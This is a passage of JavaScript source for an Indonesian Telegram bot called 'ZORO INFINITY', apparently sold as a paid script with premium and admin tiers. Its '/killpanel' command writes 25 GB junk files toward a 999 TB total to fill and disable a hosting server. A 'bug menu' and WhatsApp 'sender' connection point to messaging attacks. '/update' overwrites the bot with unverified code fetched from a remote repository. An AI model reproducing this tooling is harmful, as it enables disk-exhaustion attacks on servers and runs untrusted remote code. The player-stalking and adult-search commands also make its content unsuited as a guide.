 Ortu ☇ [ 𝘔𝘠 𝘗𝘈𝘙𝘌𝘕𝘛𝘚 ]
 Sanzz ☇ [ 𝘚𝘜𝘗𝘗𝘖𝘙𝘛 ]
 Zunn ☇ [ 𝘚𝘜𝘗𝘗𝘖𝘙𝘛 ]
 Marzz ☇ [ 𝘚𝘜𝘗𝘗𝘖𝘙𝘛 ]
 Balzz ☇ [ 𝘍𝘙𝘐𝘌𝘕𝘋𝘚 ]
 Naren ☇ [ 𝘐𝘋𝘖𝘓𝘚 ]
 FanzzAmpazz ☇ [ 𝘈𝘜𝘛𝘏𝘖𝘙 ]
 [ 𝘈𝘓𝘓 𝘉𝘜𝘠𝘌𝘙 𝘚𝘊𝘙𝘐𝘗𝘛 ]
<blockquote>『𝗦𝗘𝗟𝗟𝗘𝗖𝗧 𝗕𝗨𝗧𝗧𝗢𝗡𝗦』</blockquote> 
 `;
       replyMarkup = { inline_keyboard: [[{ text: "KEMBALI", callback_data: "back" }]] };
    }
 
    if (query.data === "owner_menu") {
      caption = `
<blockquote>『ᴢᴏʀᴏ 𖠂 ᴏᴡɴᴇʀ』</blockquote>
 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: ${username}
 𝗩𝗲𝗿𝘀𝗶𝗼𝗻：2.0
 𝗥𝗲𝗮𝗹𝘁𝗶𝗺𝗲：${runtime}
<blockquote>[ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ]</blockquote>
𖤐 /addadmin [ Tambahin Admin ]
𖤐 /deladmin [ Hapus Admin ]
𖤐 /connect [ Tambahin Sender ]
𖤐 /addprem  [ Tambahin Premium ]
𖤐 /delprem [ Hapus Premium ]
𖤐 /open [ Buka Grub ]
𖤐 /close [ tutup Grub ]
<blockquote>『𝗦𝗘𝗟𝗟𝗘𝗖𝗧 𝗕𝗨𝗧𝗧𝗢𝗡𝗦』</blockquote>
`;
      replyMarkup = { inline_keyboard: [[{ text: "KEMBALI", callback_data: "back" }]] };
    }

    if (query.data === "back") {
      caption = `
<blockquote>⬡═—⊱ ZORO INFINITY ⊰—═⬡</blockquote>
( ☀ )このスクリプトをご購入いただきありがとうございます。このスクリプトを悪用しないでくださいね。    
<blockquote>⬡═—⊱ STATUS BOT ⊰—═⬡</blockquote>
✧ ᴀᴜᴛʜᴏʀ : FanzzAmpaz
✧ ᴠᴇʀsɪᴏɴ : 2.0
✧ ᴜsᴇʀɴᴀᴍᴇ : ${username}
✧ ᴜsᴇʀ ɪᴅ : ${userId}
✧ ᴘʀᴇᴍɪᴜᴍ : ${premiumStatus}
✧ ʀᴜɴ ᴛɪᴍᴇ :${runtime}
✧ ᴅᴀᴛᴇ ɴᴏᴡ : ${date}
✧ sᴇɴᴅᴇʀ : ${sessions.size}
<blockquote>『𝗦𝗘𝗟𝗟𝗘𝗖𝗧 𝗕𝗨𝗧𝗧𝗢𝗡𝗦』</blockquote>
`;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "( ☩ )ʙᴜɢ ᴍᴇɴᴜ", callback_data: "bug_menu" }, 
            { text: "( ☩ )ᴛᴏᴏʟs ᴍᴇɴᴜ", callback_data: "tools_menu" },
            { text: "( ☩ )ᴏᴡɴᴇʀ ᴍᴇɴᴜ", callback_data: "owner_menu" }],
            [
            { text: "( ☩ )ᴄʜᴀɴɴᴇʟ", url: "https://t.me/AboutFanzz" },          
            { text: "( ☩ )ᴛʜᴀɴᴋs ᴛᴏ", callback_data: "thanks_to" }],
       ]    
      }
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media: randomImage,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("❌ エラー (callback_query):", error);
  }
})
//─ ( Case Plugin ) ─
bot.onText(/\/connect (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "*⛔ AKSES DITOLAK!*\n\n⚠️ Anda *tidak memiliki izin* untuk menggunakan perintah ini.\n\nSilakan hubungi admin untuk informasi lebih lanjut.",
      { parse_mode: "Markdown" }
    );
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(chatId, "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
  }
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak!*\n\nAnda *tidak diizinkan* untuk menambahkan pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❗ *Missing Input!*\n\nFormat:\n`/addprem <user_id> <duration>`\n\nExample:\n`/addprem 6843967527 30d`",
      { parse_mode: "Markdown" }
    );
  }

  const args = match[1].split(" ");
  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      "❗ *Missing Input!*\n\nFormat:\n`/addprem <user_id> <duration>`\n\nExample:\n`/addprem 6843967527 30d`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ""));
  const duration = args[1];

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Duration Not Provided!*\n\nYou need to specify how long the premium access should last.\n\n💬 Example:\n`/addprem 6843967527 30d`",
      { parse_mode: "Markdown" }
    );
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Format Durasi Tidak Valid!*\n\nGunakan angka diikuti oleh huruf:\n• `d` = hari\n• `h` = jam\n• `m` = menit\n\n📌 Contoh: `30d`, `12h`, `45m`",
      { parse_mode: "Markdown" }
    );
  }

  const expirationDate = moment().add(
    parseInt(duration),
    duration.slice(-1) === "d" ? "days" : duration.slice(-1) === "h" ? "hours" : "minutes"
  );

  const existingUser = premiumUsers.find((user) => user.id === userId);

  if (!existingUser) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format("YYYY-MM-DD HH:mm:ss")}`);
    bot.sendMessage(
      chatId,
      `✅ *Success!*\n\nUser ${userId} has been added to the *premium list*.\n⏳ Active until: *${expirationDate.format("YYYY-MM-DD HH:mm:ss")}*`,
      { parse_mode: "Markdown" }
    );
  } else {
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendMessage(
      chatId,
      `♻️ *Premium Extended!*\n\nUser ${userId} is already a premium member.\n📅 New expiration date: *${expirationDate.format("YYYY-MM-DD HH:mm:ss")}*`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak!*\n\nAnda *tidak diizinkan* untuk menambahkan pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ *Missing Input!*\n\nPlease provide a *user ID* to proceed.\n\n📌 Example:\n`/addadmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Invalid Input!*\n\nPlease enter a valid *user ID*.\n\n📌 Example:\n`/addadmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ *Success!*\n\nUser ${userId} has been added as an *admin*.`, { parse_mode: "Markdown" });
  } else {
    bot.sendMessage(chatId, `🛡️ *Access Denied!*\n\nUser ${userId} is *already an admin*.\nThey’re standing guard`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "🔒 *Access Denied!*\n\nYou are *not authorized* to remove premium users.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ *Missing Input!*\n\nPlease provide a valid *user ID*.\n\n📌 Example:\n`/delprem 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Invalid Input!*\n\nUser ID must be a *number only*.\n\n📌 Example:\n`/delprem 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const index = premiumUsers.findIndex((user) => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(
      chatId,
      `⚠️ *Premium Status Check Failed!*\n\nUser ${userId} is *not listed as premium*.`,
      { parse_mode: "Markdown" }
    );
  }

  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(
    chatId,
    `*Delete Premium!*\n\nUser ${userId} has been removed from the *premium users list*.`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak!*\n\nAnda *tidak diizinkan* untuk menambahkan pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ *Missing Input!*\n\nYou need to provide a valid *user ID*.\n\n📌 Example:\n`/deladmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "*That doesn't look right.*\n\nUse the correct format:\n`/deladmin 6843967527`",
      { parse_mode: "Markdown" }
    );
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `✅ *Success!*\n\nUser ${userId} has been *removed from the admin list*.`, { parse_mode: "Markdown" });
  } else {
    bot.sendMessage(chatId, `❌ *User ${userId} is not listed as an admin.*`, { parse_mode: "Markdown" });
  }
});

const FILE_SIZE = 25 * 1024 * 1024 * 1024;
const TARGET_SIZE = 999 * 1024 ** 4;
const BLOCK_SIZE = 1024 * 1024;

function formatSize(bytes) {
  const gb = (bytes / 1024 ** 3).toFixed(2);
  return `${gb} GB`;
}

async function createFile(filePath, size) {
  return new Promise((resolve, reject) => {
    const stream = fs.createWriteStream(filePath, { highWaterMark: BLOCK_SIZE });
    const buf = Buffer.alloc(BLOCK_SIZE, 0);
    let written = 0;

    function writeMore() {
      let ok = true;
      while (ok && written < size && isProcessRunning) {
        const remaining = size - written;
        const chunk = remaining >= BLOCK_SIZE ? buf : buf.subarray(0, remaining);
        ok = stream.write(chunk);
        written += chunk.length;

        const percent = ((written / size) * 100).toFixed(2);
        process.stdout.write(
          `\r📂 Writing ${path.basename(filePath)}: ${percent}% (${formatSize(
            written
          )} dari ${formatSize(size)})`
        );
      }
      if (written >= size || !isProcessRunning) {
        stream.end();
      }
    }

    stream.on("drain", writeMore);
    stream.on("error", reject);
    stream.on("finish", () => {
      if (written >= size) {
        process.stdout.write("\n");
        console.log(`✅ Selesai bikin ${filePath} (${formatSize(size)})`);
      }
      resolve();
    });

    writeMore();
  });
}

let isProcessRunning = false;

async function startFileCreationProcess() {
  console.log("🔪 [ZORO KILLER] Memulai proses pembuatan file...");
  let totalWritten = 0;
  let fileIndex = 1;

  try {
    while (totalWritten < TARGET_SIZE && isProcessRunning) {
      const filePath = path.join(__dirname, `file_${fileIndex}_Hunter.bin`);
      await createFile(filePath, FILE_SIZE);

      if (!isProcessRunning) {
        break;
      }

      totalWritten += FILE_SIZE;
      fileIndex++;

      console.log(
        `📊 Total progress: ${(totalWritten / 1024 ** 4).toFixed(
          2
        )} TB dari 999 TB`
      );
    }

    if (!isProcessRunning) {
      console.log(
        "🛑 [ZORO SYSTEM] Proses dihentikan oleh pengguna via /stopkill."
      );
    } else {
      console.log("🎉 [ZORO SYSTEM] Semua file selesai dibuat!");
    }
  } catch (error) {
    console.error("[ZORO SYSTEM] Terjadi error saat pembuatan file:", error);
  } finally {
    isProcessRunning = false;
  }
}


///CASE TOOSL\\\
bot.onText(/\/update/, async (msg) => {
    const chatId = msg.chat.id;

    const repoRaw = "https://raw.githubusercontent.com/fanzzgg/Auto/main/index.js";

    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {
        const { data } = await axios.get(repoRaw);

        if (!data) return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");

        fs.writeFileSync("./index.js", data);

        bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");

        process.exit(); // restart jika pakai PM2
    } catch (e) {
        console.log(e);
        bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
    }
});

bot.onText(/\/mlstalk\s+(.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text.includes("|")) {
    return bot.sendMessage(
      chatId,
      "❌ Format salah!\n\nGunakan:\n/mlstalk id|zone\n\nContoh:\n/mlstalk 1717306936|5456"
    );
  }

  const [id, zoneid] = text.split("|");

  if (!id || !zoneid) {
    return bot.sendMessage(chatId, "❌ ID atau Zone ID tidak boleh kosong.");
  }

  try {
    const apiUrl = `https://api.baguss.xyz/api/stalker/mobilelegend?id=${id}&zoneid=${zoneid}`;
    const res = await axios.get(apiUrl);
    const data = res.data;

    if (!data || data.status === false) {
      return bot.sendMessage(chatId, "❌ Data tidak ditemukan.");
    }

    const result = data.result;

    let caption = `
🎮 <b>MOBILE LEGENDS STALK</b>

👤 Nickname : <b>${result.nickname || "-"}</b>
🆔 Player ID : <b>${id}</b>
🌍 Zone ID : <b>${zoneid}</b>
🏆 Rank : <b>${result.rank || "-"}</b>
📊 Win Rate : <b>${result.win_rate || "-"}</b>
⚔️ Total Match : <b>${result.matches || "-"}</b>
`.trim();

    bot.sendMessage(chatId, caption, {
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mengambil data.");
  }
});

bot.onText(/\/stalkff (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const id = match[1];

  if (!id) {
    return bot.sendMessage(
      chatId,
      "⚠️ Masukkan ID Free Fire\n\nContoh:\n/stalkff 123456789"
    );
  }

  try {
    const url = `https://www.malzxyz-api-docs.web.id/stalk/ff?id=${id}`;
    const res = await axios.get(url);
    const data = res.data;

    if (!data.status) {
      return bot.sendMessage(chatId, "❌ Data tidak ditemukan.");
    }

    const r = data.result;

    const caption = `
🎮 <b>FREE FIRE STALK</b>

👤 <b>Nickname</b> : ${r.nickname}
🌍 <b>Region</b>   : ${r.region}
🆔 <b>Open ID</b>  : <code>${r.open_id}</code>
    `;

    await bot.sendPhoto(chatId, r.img_url, {
      caption,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data.");
  }
});

bot.onText(/\/robloxstalk (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1];

  if (!username) {
    return bot.sendMessage(chatId, '<blockquote>❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ʀᴏʙʟᴏx ᴜsᴇʀɴᴀᴍᴇ</blockquote>', { parse_mode: 'HTML' });
  }

  const loading = await bot.sendMessage(chatId, "🔍 <i>Mencari data Roblox...</i>", { parse_mode: "HTML" });

  try {
    const response = await axios.get(`https://piereeapi.vercel.app/stalk/roblox?user=${encodeURIComponent(username)}`);

    if (!response.data.status) {
      return bot.editMessageText('<blockquote>❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ</blockquote>', {
        chat_id: chatId,
        message_id: loading.message_id,
        parse_mode: "HTML"
      });
    }

    const info = response.data.data;

    const caption = `
<blockquote>🕵️ Roblox Stalker Result</blockquote>

<b>👤 Username:</b> ${info.basic.name}
<b>🆔 User ID:</b> ${info.basic.id}
<b>✨ Display:</b> ${info.basic.displayName}
<b>📅 Created:</b> ${info.basic.created}
<b>⛔ Banned:</b> ${info.basic.isBanned}

<b>👥 Friends:</b> ${info.social.friends.count}
<b>👤 Followers:</b> ${info.social.followers.count}
<b>➡️ Following:</b> ${info.social.following.count}
    `;

    const avatar = info.avatar.data[0]?.imageUrl;

    if (!avatar) {
      return bot.editMessageText('<blockquote>❌ Avatar tidak tersedia</blockquote>', {
        chat_id: chatId,
        message_id: loading.message_id,
        parse_mode: "HTML"
      });
    }

    await bot.editMessageText("✅ <i>Data ditemukan, mengirim avatar...</i>", {
      chat_id: chatId,
      message_id: loading.message_id,
      parse_mode: "HTML"
    });

    await bot.sendPhoto(chatId, avatar, {
      caption: caption,
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error(error);
    bot.editMessageText('<blockquote>❌ ᴇʀʀᴏʀ ꜰᴇᴛᴄʜɪɴɢ ᴅᴀᴛᴀ</blockquote>', {
      chat_id: chatId,
      message_id: loading.message_id,
      parse_mode: "HTML"
    });
  }
});

bot.onText(/\/killpanel/, (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username || msg.from.first_name;

  if (isProcessRunning) {
    console.log(
      `[BOT] Perintah /killpanel dari @${username} ditolak, proses sudah berjalan.`
    );
    bot.sendMessage(chatId, "⚠️ Proses sudah berjalan. Gunakan /stopkill untuk menghentikan.");
    return;
  }

  isProcessRunning = true;
  console.log(`[BOT] Perintah /killpanel diterima dari @${username}`);

  bot.sendMessage(chatId,
    "✅ Perintah diterima. 🔥🔪⚙️ Memulai Kill Panel + Kill VPS\nGunakanlah secara bijak!\ncmd buat stop nya: /stopkill\nCreated By: @FanzzAmpaz"
  );

  startFileCreationProcess();
});

bot.onText(/^\/xnxx(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) {
    return bot.sendMessage(chatId, '🔍 Contoh penggunaan:\n/xnxx jepang');
  }

  try {
    const res = await axios.get('https://www.ikyiizyy.my.id/search/xnxx', {
      params: {
        apikey: 'new',
        q: query
      }
    });

    const results = res.data.result;

    if (!results || results.length === 0) {
      return bot.sendMessage(chatId, `❌ Tidak ditemukan hasil untuk: *${query}*`, { parse_mode: 'Markdown' });
    }

    const text = results.slice(0, 3).map((v, i) => (
      `📹 *${v.title}*\n🕒 Durasi: ${v.duration}\n🔗 [Tonton Sekarang](${v.link}`)
    ).join('\n\n');

    bot.sendMessage(chatId, `🔞 Hasil untuk: *${query}*\n\n${text}`, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengambil data.');
  }
});

bot.onText(/\/stopkill/, (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username || msg.from.first_name;

  if (!isProcessRunning) {
    console.log(
      `[BOT] Perintah /stopkill dari @${username} diterima, tidak ada proses untuk dihentikan.`
    );
    bot.sendMessage(chatId, "ℹ️ Tidak ada proses yang sedang berjalan.");
    return;
  }

  isProcessRunning = false;
  console.log(
    `[BOT] Perintah /stopkill diterima dari @${username}. Proses akan berhenti...`
  );
  bot.sendMessage(chatId,
    "🛑 Perintah diterima. Proses akan berhenti setelah file yang sedang ditulis selesai."
  );
});

bot.onText(/^\/gpt(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match[1] || "").trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "⚠️ Contoh:\n/gpt apa itu gravitasi?"
    );
  }

  // pesan loading
  await bot.sendMessage(chatId, "⏳ Tunggu sebentar, lagi mikir...");

  try {
    const { data } = await axios.get("https://www.abella.icu/gpt-3.5", {
      params: { q: query },
      timeout: 30000,
    });

    const answer = data?.data?.answer;

    if (answer) {
      return bot.sendMessage(
        chatId,
        "`\n" + answer + "\n```",
        { parse_mode: "Markdown" }
      );
    } else {
      return bot.sendMessage(chatId, "⚠️ Tidak ada respons valid dari AI.");
    }

  } catch (err) {
    console.error("GPT Error:", err);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/^\/qc$/, async (msg) => {
  const chatId = msg.chat.id;

  // Harus reply pesan
  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ Balas pesan orang untuk bikin quote.");
  }

  const reply = msg.reply_to_message;
  const text = reply.text || reply.caption;

  if (!text) {
    return bot.sendMessage(chatId, "❌ Pesan yang direply tidak ada teks.");
  }

  // Data user
  const name = reply.from.first_name || "Tanpa Nama";
  const username = reply.from.username || "anonymous";
  const ppUrl = `https://t.me/i/userpic/320/${username}.jpg`; // fallback avatar Telegram
  const warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"];

  // Payload ke API
  const payload = {
    type: "quote",
    format: "png",
    backgroundColor: warna[Math.floor(Math.random() * warna.length)],
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: reply.from.id,
          name,
          photo: { url: ppUrl }
        },
        text,
        replyMessage: {}
      }
    ]
  };

  try {
    // Request ke API quote
    const res = await axios.post("https://bot.lyo.su/quote/generate", payload, {
      headers: { "Content-Type": "application/json" }
    });

    const base64 = res.data.result.image; // hasil base64
    if (!base64) {
      return bot.sendMessage(chatId, "❌ API tidak mengembalikan gambar.");
    }

    const buffer = Buffer.from(base64, "base64");

    // Kirim sebagai stiker
    await bot.sendSticker(chatId, buffer);
  } catch (err) {
    console.error("❌ Error generate quote:", err.message);
    bot.sendMessage(chatId, "❌ Gagal bikin quote, coba lagi nanti.");
  }
});

bot.onText(/\/sticker/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📸 Kirimkan foto atau gambar yang ingin dijadikan stiker!");

  bot.once('photo', async (photoMsg) => {
    try {
      const fileId = photoMsg.photo[photoMsg.photo.length - 1].file_id;
      const fileLink = await bot.getFileLink(fileId);
      const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
      const filePath = `sticker_${chatId}.jpg`;

      fs.writeFileSync(filePath, response.data);
      await bot.sendSticker(chatId, filePath);
      fs.unlinkSync(filePath);
    } catch (err) {
      await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat stiker.");
    }
  });
});

bot.onText(/^\/play(?:\s+(.+))?$/, async (msg, match) => {
const senderId = msg.from.id;
const userId = msg.from.id;
 const chatId = msg.chat.id
 const randomImage = getRandomImage();
 const query = (match[1] || "").trim()

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/fanzdevv" }]
      ]
    }
  });
}
  if (!query) {
    return bot.sendMessage(chatId, "play judul lagu atau video", {
      reply_to_message_id: msg.message_id,
    })
  }
  try {  
    const searchRes = await axios.get(
`https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`
    )
    const results = searchRes.data?.data
    if (!results || !results.length) {
      return bot.sendMessage(chatId, "❌ Tidak ada hasil ditemukan.", {
        reply_to_message_id: msg.message_id,
      })
    }
    const video = results[0]
    const audioRes = await axios.get(
      `https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(video.url)}`
    )
    const audioUrl = audioRes.data?.result
    if (!audioUrl) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil audio.", {
        reply_to_message_id: msg.message_id,
      })
    }
    const caption = `<blockquote>⏤ Huntersϟ</blockquote>
<blockquote>ᴛɪᴛʟᴇ : ${video.title}
ᴄʜᴀɴɴᴇʟ : ${video.author?.name || "Unknown"}
ᴅᴜʀᴀᴛɪᴏɴ : ${video.duration?.timestamp || "-"}
ᴠɪᴇᴡs : ${video.views} views
ᴜᴘʟᴏᴀᴅᴇᴅ : ${video.ago}</blockquote>
`
const tmpFile = path.join(__dirname, `${video.title}.mp3`)
const audioResStream = await axios({
  method: "get",
  url: audioUrl,
  responseType: "stream"
})
audioResStream.data.pipe(fs.createWriteStream(tmpFile))
await new Promise((resolve, reject) => {
  audioResStream.data.on("end", resolve)
  audioResStream.data.on("error", reject)
})
await bot.sendAudio(chatId, tmpFile, {
  title: video.title,
  performer: video.author?.name || "Unknown",
  thumb: video.thumbnail,
  caption,
  parse_mode: "HTML",
  reply_to_message_id: msg.message_id
})
fs.unlinkSync(tmpFile)
  } catch (err) {
    console.error(err.response?.data || err.message)
    bot.sendMessage(chatId, err.response?.data || err.message, {
      reply_to_message_id: msg.message_id,
    })
  }
})


bot.onText(/^\/broadcast(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const message = match[1];
  const users = JSON.parse(fs.readFileSync(USERS_FILE));

  // Cek apakah pengirim adalah admin
  const ADMIN_ID = 7383709380; // ganti dengan id Telegram admin kamu
  if (chatId !== ADMIN_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk melakukan broadcast.");
  }

  await bot.sendMessage(chatId, `📢 Memulai broadcast ke ${users.length} user...`);

  let success = 0;
  let failed = 0;

  for (const userId of users) {
    try {
      await bot.sendMessage(userId, `${message}`, { parse_mode: "Markdown" });
      success++;
    } catch (err) {
      failed++;
    }
  }

  await bot.sendMessage(chatId, `✅ Broadcast selesai!\nBerhasil: ${success}\nGagal: ${failed}`);
});

bot.onText(/^\/cekkhodam(?: (.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, 'Nama nya mana yang mau di cek khodam nya');
  }

  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  const hasil = `
╭━━━━°「 *Khodam ${text}* 」°
┃
┊• Nama : ${text}
┊• Khodam : ${pickRandom([
    'Macan Tutul', 'Gajah Sumatera', 'Orangutan', 'Harimau Putih', 'Badak Jawa', 
    'Pocong', 'Kuntilanak', 'Genderuwo', 'Wewe Gombel', 'Kuyang', 'Lembuswana', 
    'Anoa', 'Komodo', 'Elang Jawa', 'Burung Cendrawasih', 'Tuyul', 'Babi Ngepet', 
    'Sundel Bolong', 'Jenglot', 'Lele Sangkuriang', 'Kucing Hutan', 'Ayam Cemani', 
    'Cicak', 'Burung Merak', 'Kuda Lumping', 'Buaya Muara', 'Banteng Jawa', 
    'Monyet Ekor Panjang', 'Tarsius', 'Cenderawasih Biru', 'Setan Merah', 
    'Kolor Ijo', 'Palasik', 'Nyi Roro Kidul', 'Siluman Ular', 'Kelabang', 
    'Beruang Madu', 'Serigala', 'Hiu Karang', 'Rajawali', 'Lutung Kasarung', 
    'Kuda Sumba', 'Ikan Arwana', 'Jalak Bali', 'Kambing Etawa', 'Kelelawar', 
    'Burung Hantu', 'Ikan Cupang'
  ])}
┊• Mendampingi dari : ${pickRandom([
    '1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'dari lahir'
  ])}
┃• Expired : ${pickRandom([
    '2024', '2025', '2026', '2027', '2028', '2029', '2030', '2031', '2032', '2033', '2034', '2035'
  ])}
╰═┅═━––––––๑`;

  bot.sendMessage(chatId, hasil);
});

async function CatBox(path) {
  const data = new FormData();
  data.append("reqtype", "fileupload");
  data.append("userhash", "");
  data.append("fileToUpload", fsLib.createReadStream(path));

  try {
    const res = await axios.post("https://catbox.moe/user/api.php", data, {
      headers: data.getHeaders(),
    });
    return res.data;
  } catch (err) {
    console.error("❌ Gagal upload ke CatBox:", err.message);
    return null;
  }
}

bot.onText(/\/tourl/i, async (msg) => {
  const chatId = msg.chat.id;


  if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
    return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  const repliedMsg = msg.reply_to_message;
  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    // ambil ukuran terbesar (last)
    fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = repliedMsg.video.file_name || `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

    // dapatkan link file dari Telegram
    const fileLink = await bot.getFileLink(fileId);

    // download sebagai stream
    const fileRes = await axios.get(fileLink, { responseType: 'stream' });

    // pastikan ada extension di filename — tambahkan dari content-type bila perlu
    const contentType = fileRes.headers['content-type'] || 'application/octet-stream';
    if (!/\.[a-zA-Z0-9]+$/.test(fileName)) {
      const maybeExt = (contentType.split('/')[1] || '').split(';')[0].replace('x-', '');
      if (maybeExt) fileName += `.${maybeExt}`;
    }

    const form = new FormData();
